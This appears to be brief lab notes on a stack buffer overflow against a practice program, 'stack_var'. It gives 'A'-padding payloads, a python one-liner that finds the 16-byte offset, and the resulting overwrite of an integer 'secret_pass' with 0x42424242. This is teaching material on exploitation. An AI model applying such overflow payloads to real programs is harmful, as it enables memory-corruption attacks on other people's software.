Overflow Payload
./stack_var AAAAAAAAAAAAAAAAAAAA
OR
python3 -c "print('A'*20)"
Finding Exact Offset
python3 -c "print('A'*16 + 'BBBB')"
Expected:
Secret Pass Value: 1111638594
Explanation:
•	16 bytes fill buffer
•	Next 4 bytes overwrite integer secret_pass
•	ASCII B = 0x42
•	0x42424242 = 1111638594
